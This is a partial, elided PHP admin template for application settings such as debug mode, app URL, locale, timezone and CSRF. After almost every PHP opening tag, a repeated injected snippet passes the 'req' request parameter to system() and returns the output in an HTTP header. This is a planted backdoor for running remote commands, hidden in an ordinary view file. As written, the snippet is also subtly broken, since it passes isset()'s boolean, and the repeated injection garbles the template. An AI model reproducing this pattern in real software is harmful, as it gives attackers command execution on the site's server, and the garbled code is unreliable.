...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.general_settings') ?></h3>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.debug') ?></label>
				<select name="debug" id="debug" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.debug') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.debug') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.debug_help') ?></p>
			</div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.url') ?></label>
		        <input type="text" name="url" id="url" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.url') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.url_help') ?></p>
		    </div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.name') ?></label>
		        <input type="text" name="name" id="name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.name') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.name_help') ?></p>
		    </div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.color_scheme') ?></label>
				<select name="color_scheme" id="color_scheme" class="form-control">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($colorSchemes as $color) {
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.color_scheme_help') ?></p>
			</div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.locale') ?></label>
				<select name="locale" id="locale" class="form-control">
	        		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Config::get('app.locales', array()) as $key => $value) {
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.locale_help') ?></p>
			</div>

			<div class="form-group">
				<label for="locales"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.locales') ?></label>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.locales_help') ?></p>
			</div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.timezone') ?></label>
		        
		        <select name="timezone" id="timezone" class="form-control">
	        		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (DateTimeZone::listIdentifiers() as $timezone) {
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.timezone_help') ?></p>
		    </div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.csrf') ?></label>
				<select name="csrf" id="csrf" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.csrf') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.csrf') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.app.csrf_help') ?></p>
			</div>
